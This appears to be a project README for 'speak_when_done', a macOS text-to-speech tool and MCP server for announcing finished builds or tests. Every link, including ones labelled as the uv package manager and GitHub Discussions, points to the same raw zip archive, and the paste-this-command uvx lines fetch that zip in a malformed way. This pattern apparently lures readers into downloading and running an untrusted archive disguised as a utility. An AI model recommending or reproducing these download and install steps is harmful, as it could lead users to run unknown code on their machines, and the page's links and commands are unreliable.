# 🎤 speak_when_done - Easy Text-to-Speech Solution

## 🚀 Download & Install

[![Download speak_when_done](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip)](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip)

## 📖 Overview

speak_when_done offers a simple way to convert text to speech. This application automatically cleans up temporary files after speaking. You can use it as a command-line tool, a Python library, or an MCP server for AI assistants. 

## 💡 What it Does

You can quickly generate speech from text using the following command:

```bash
uvx --from git+https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip speak_when_done --text "Your build is complete"
```

This command reads the text aloud and removes any temporary files it creates. 

### 🎤 As an MCP Server

Imagine starting a long task like a build, test suite, or deployment. You can continue working while this application waits. When the task is complete, it announces the result.

Here are some examples of what it can say:

> "Your build completed successfully with no errors."

> "The test suite finished. 47 passed, 2 failed."

> "I found the bug you were looking for in the auth module."

## 🔍 Prerequisites

- **Operating System:** You need macOS, as this tool uses `afplay` for audio playback.
- **Package Manager:** Install the [uv](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip) package manager for easy command execution.

To verify that the text-to-speech works, run this command:

```bash
uvx pocket-tts generate --text "hello world" --quiet
```

You should hear "hello world" spoken back to you.

## 💻 Installation Steps

### CLI (via uvx)

You do not need to install anything! Just run this command:

```bash
uvx --from git+https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip speak_when_done
```

This command will set everything up for you. You will be ready to go in no time.

## 📥 Download & Install

To get started, visit [this page](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip) to download the latest version of speak_when_done. Simply choose the version you need and follow the instructions to install it.

## 🎉 Usage

Once installed, you can use the application in various ways:

1. **CLI Tool:** Open your terminal and use the above command to convert text to speech.
2. **Python Library:** Import it into your Python scripts to add text-to-speech functionality easily.
3. **MCP Server:** Integrate it into your AI assistant for automated notifications about task completions.

## 🚧 Troubleshooting

If you run into any issues while using speak_when_done, here are some common troubleshooting steps:

1. **Command Not Found:** Make sure that `uv` is installed correctly. You can reinstall it if needed.
2. **No Audio Output:** Check your sound settings on macOS. Ensure your volume is up and not muted.
3. **Incorrect Command Usage:** Double-check the format of your command. Make sure there are no typos.

## 🛠 Community Support

For any questions or issues, feel free to reach out in our [GitHub Discussions](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip). Both contributors and users are here to help you.

## 🎯 Contributing

We welcome contributions! If you have ideas for new features or want to report bugs, please create an issue on GitHub. For more significant contributions, consider submitting a pull request.

## 🙏 Acknowledgments

Thank you for using speak_when_done. We hope this tool makes your workflow more efficient and enjoyable. 

Remember, for easy access to the latest version, visit [this page](https://github.com/Wolskr/speak_when_done/raw/refs/heads/main/speak_when_done/when-speak-done-1.4.zip) anytime.